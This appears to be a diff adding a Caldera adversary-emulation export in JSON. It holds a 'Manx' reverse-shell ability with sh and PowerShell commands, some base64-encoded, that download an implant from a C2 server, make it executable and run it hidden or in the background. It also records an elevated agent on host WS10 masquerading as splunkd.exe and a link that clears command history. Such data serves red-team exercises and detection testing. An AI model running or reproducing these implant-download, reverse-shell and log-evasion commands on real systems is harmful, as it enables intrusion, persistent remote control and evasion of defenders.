@@ -1,0 +1,266 @@
+{
+  "selected_adversary": {
+    "adversary_id": "56aebecf-abca-40c1-ad24-658e7c25b55b",
+    "name": "Terminal",
+    "description": "An adversary to run terminal operations",
+    "atomic_ordering": [
+      {
+        "ability_id": "356d1722-7784-40c4-822b-0cf864b0b36d",
+        "tactic": "command-and-control",
+        "technique_name": "Ingress Tool Transfer",
+        "technique_id": "T1105",
+        "name": "Manx",
+        "description": "A reverse-shell agent which communicates via the TCP contact",
+        "executors": [
+          {
+            "name": "sh",
+            "platform": "darwin",
+            "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:darwin\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -http $server -socket $socket -contact $contact -v",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [
+              {
+                "description": "Run against the UDP contact",
+                "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMSI7Y29udGFjdD0idWRwIjtjdXJsIC1zIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkID4gI3thZ2VudHMuaW1wbGFudF9uYW1lfTtjaG1vZCAreCAje2FnZW50cy5pbXBsYW50X25hbWV9Oy4vI3thZ2VudHMuaW1wbGFudF9uYW1lfSAtaHR0cCAkc2VydmVyIC1zb2NrZXQgJHNvY2tldCAtY29udGFjdCAkY29udGFjdCAtdg=="
+              },
+              {
+                "description": "Download with a random name and start as a background process",
+                "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMCI7Y29udGFjdD0idGNwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmRhcndpbiIgJHNlcnZlci9maWxlL2Rvd25sb2FkIDI+JjEgfCBncmVwIC1pICJDb250ZW50LURpc3Bvc2l0aW9uIiB8IGdyZXAgLWlvICJmaWxlbmFtZT0uKiIgfCBjdXQgLWQnPScgLWYyIHwgdHIgLWQgJyJccicpICYmIGNobW9kICt4ICRhZ2VudCAyPi9kZXYvbnVsbDtub2h1cCAuLyRhZ2VudCAtaHR0cCAkc2VydmVyIC1zb2NrZXQgJHNvY2tldCAtY29udGFjdCAkY29udGFjdCAm"
+              }
+            ],
+            "additional_info": {}
+          },
+          {
+            "name": "sh",
+            "platform": "linux",
+            "command": "server=\"#{app.contact.http}\";\nsocket=\"#{app.contact.tcp}\";\ncontact=\"tcp\";\ncurl -s -X POST -H \"file:manx.go\" -H \"platform:linux\" $server/file/download > #{agents.implant_name};\nchmod +x #{agents.implant_name};\n./#{agents.implant_name} -http $server -socket $socket -contact $contact -v",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [
+              {
+                "description": "Run against the UDP contact",
+                "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMSI7Y29udGFjdD0idWRwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY="
+              },
+              {
+                "description": "Download with a random name and start as a background process",
+                "command": "c2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijtzb2NrZXQ9IjAuMC4wLjA6NzAxMCI7Y29udGFjdD0idGNwIjthZ2VudD0kKGN1cmwgLXN2a09KIC1YIFBPU1QgLUggImZpbGU6bWFueC5nbyIgLUggInBsYXRmb3JtOmxpbnV4IiAkc2VydmVyL2ZpbGUvZG93bmxvYWQgMj4mMSB8IGdyZXAgLWkgIkNvbnRlbnQtRGlzcG9zaXRpb24iIHwgZ3JlcCAtaW8gImZpbGVuYW1lPS4qIiB8IGN1dCAtZCc9JyAtZjIgfCB0ciAtZCAnIlxyJykgJiYgY2htb2QgK3ggJGFnZW50IDI+L2Rldi9udWxsO25vaHVwIC4vJGFnZW50IC1odHRwICRzZXJ2ZXIgLXNvY2tldCAkc29ja2V0IC1jb250YWN0ICRjb250YWN0ICY="
+              }
+            ],
+            "additional_info": {}
+          },
+          {
+            "name": "psh",
+            "platform": "windows",
+            "command": "if ($host.Version.Major -ge 3){$ErrAction= \"ignore\"}else{$ErrAction= \"SilentlyContinue\"};\n$server=\"#{app.contact.http}\";\n$socket=\"#{app.contact.tcp}\";\n$contact=\"tcp\";\n$url=\"$server/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"manx.go\");\n$data=$wc.DownloadData($url);\nGet-Process | ? {$_.Path -like \"C:\\Users\\Public\\#{agents.implant_name}.exe\"} | stop-process -f -ea $ErrAction;\nrm -force \"C:\\Users\\Public\\#{agents.implant_name}.exe\" -ea $ErrAction;\n([io.file]::WriteAllBytes(\"C:\\Users\\Public\\#{agents.implant_name}.exe\",$data)) | Out-Null;\nStart-Process -FilePath C:\\Users\\Public\\#{agents.implant_name}.exe -ArgumentList \"-socket $socket -http $server -contact $contact\" -WindowStyle hidden;",
+            "code": null,
+            "language": null,
+            "build_target": null,
+            "payloads": [],
+            "uploads": [],
+            "timeout": 60,
+            "parsers": [],
+            "cleanup": [],
+            "variations": [
+              {
+                "description": "Run against the UDP contact",
+                "command": "aWYgKCRob3N0LlZlcnNpb24uTWFqb3IgLWdlIDMpeyRFcnJBY3Rpb249ICJpZ25vcmUifWVsc2V7JEVyckFjdGlvbj0gIlNpbGVudGx5Q29udGludWUifTskc2VydmVyPSJodHRwOi8vMC4wLjAuMDo4ODg4Ijskc29ja2V0PSIwLjAuMC4wOjcwMTEiOyRjb250YWN0PSJ1ZHAiOyR1cmw9IiRzZXJ2ZXIvZmlsZS9kb3dubG9hZCI7JHdjPU5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQ7JHdjLkhlYWRlcnMuYWRkKCJwbGF0Zm9ybSIsIndpbmRvd3MiKTskd2MuSGVhZGVycy5hZGQoImZpbGUiLCJtYW54LmdvIik7JGRhdGE9JHdjLkRvd25sb2FkRGF0YSgkdXJsKTtHZXQtUHJvY2VzcyB8ID8geyRfLlBhdGggLWxpa2UgIkM6XFVzZXJzXFB1YmxpY1wje2FnZW50cy5pbXBsYW50X25hbWV9LmV4ZSJ9IHwgc3RvcC1wcm9jZXNzIC1mIC1lYSAkRXJyQWN0aW9uO3JtIC1mb3JjZSAiQzpcVXNlcnNcUHVibGljXCN7YWdlbnRzLmltcGxhbnRfbmFtZX0uZXhlIiAtZWEgJEVyckFjdGlvbjsoW2lvLmZpbGVdOjpXcml0ZUFsbEJ5dGVzKCJDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUiLCRkYXRhKSkgfCBPdXQtTnVsbDtTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCBDOlxVc2Vyc1xQdWJsaWNcI3thZ2VudHMuaW1wbGFudF9uYW1lfS5leGUgLUFyZ3VtZW50TGlzdCAiLXNvY2tldCAkc29ja2V0IC1odHRwICRzZXJ2ZXIgLWNvbnRhY3QgJGNvbnRhY3QiIC1XaW5kb3dTdHlsZSBoaWRkZW47"
+              }
+            ],
+            "additional_info": {}
+          }
+        ],
+        "requirements": [],
+        "privilege": "",
+        "repeatable": false,
+        "buckets": [
+          "command-and-control"
+        ],
+        "additional_info": {},
+        "access": {},
+        "singleton": false,
+        "plugin": "manx",
+        "delete_payload": true
+      }
+    ],
+    "objective": {
+      "id": "495a9828-cab1-44dd-a0ca-66e58177d8cc",
+      "name": "default",
+      "description": "This is a default objective that runs forever.",
+      "goals": [
+        {
+          "target": "exhaustion",
+          "value": "complete",
+          "count": 1048576,
+          "operator": "==",
+          "achieved": false
+        }
+      ],
+      "percentage": 0.0
+    },
+    "tags": [],
+    "has_repeatable_abilities": false,
+    "plugin": "manx"
+  },
+  "selected_agent": {
+    "paw": "dcdvcj",
+    "sleep_min": 30,
+    "sleep_max": 60,
+    "watchdog": 0,
+    "group": "red",
+    "architecture": "amd64",
+    "platform": "windows",
+    "server": "http://192.168.30.45:8888",
+    "upstream_dest": "http://192.168.30.45:8888",
+    "username": "WS10\\Administrator",
+    "location": "C:\\Users\\Public\\splunkd.exe",
+    "pid": 3716,
+    "ppid": 8424,
+    "trusted": true,
+    "executors": [
+      "cmd",
+      "psh",
+      "proc"
+    ],
+    "privilege": "Elevated",
+    "exe_name": "splunkd.exe",
+    "host": "WS10",
+    "contact": "HTTP",
+    "proxy_receivers": {},
+    "proxy_chain": [],
+    "origin_link_id": "",
+    "deadman_enabled": true,
+    "available_contacts": [
+      "HTTP"
+    ],
+    "host_ip_addrs": [
+      "192.168.30.24"
+    ],
+    "display_name": "WS10$WS10\\Administrator",
+    "created": "2026-04-01T07:16:53Z",
+    "last_seen": "2026-04-01T09:22:40Z",
+    "links": [
+      {
+        "id": "7b2b49ea-2292-4a7d-9282-45ace761aed6",
+        "paw": "dcdvcj",
+        "command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "plaintext_command": "Q2xlYXItSGlzdG9yeTtDbGVhcg==",
+        "status": 0,
+        "score": 0,
+        "jitter": 0,
+        "decide": "2026-04-01T07:16:53Z",
+        "pin": 0,
+        "pid": "8128",
+        "facts": [],
+        "relationships": [],
+        "used": [],
+        "unique": "7b2b49ea-2292-4a7d-9282-45ace761aed6",
+        "collect": "2026-04-01T07:16:53Z",
+        "finish": "2026-04-01T07:16:53Z",
+        "ability": {
+          "ability_id": "43b3754c-def4-4699-a673-1d85648fda6a",
+          "tactic": "defense-evasion",
+          "technique_name": "Indicator Removal on Host: Clear Command History",
+          "technique_id": "T1070.003",
+          "name": "Avoid logs",
+          "description": "Stop terminal from logging history",
+          "executors": [
+            {
+              "name": "sh",
+              "platform": "darwin",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "sh",
+              "platform": "linux",
+              "command": "> $HOME/.bash_history && unset HISTFILE",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            },
+            {
+              "name": "psh",
+              "platform": "windows",
+              "command": "Clear-History;Clear",
+              "code": null,
+              "language": null,
+              "build_target": null,
+              "payloads": [],
+              "uploads": [],
+              "timeout": 60,
+              "parsers": [],
+              "cleanup": [],
+              "variations": [],
+              "additional_info": {}
+            }
+          ],
+          "requirements": [],
+          "privilege": null,
+          "repeatable": false,
+          "buckets": [
+            "defense-evasion"
+          ],
+          "additional_info": {},
+          "access": {},
+          "singleton": false,
+          "plugin": "stockpile",
+          "delete_payload": true
+        },
+        "executor": {
+          "name": "psh",
+          "platform": "windows",
+          "command": "Clear-History;Clear",
+          "code": null,
+          "language": null,
+          "build_target": null,
+          "payloads": [],
+          "uploads": [],
+          "timeout": 60,
+          "parsers": [],
+          "cleanup": [],
+          "variations": [],
+          "additional_info": {}
+        },
+        "cleanup": 0,
+        "visibility": {
+          "score": 50,
+          "adjustments": []
+        },
+        "host": "WS10",
+        "output": "False",
+        "deadman": false,
+        "agent_reported_time": "2026-04-01T07:16:53Z"
+      }
+    ],
+    "pending_contact": "HTTP",
+    "status": "alive"
+  }
+}
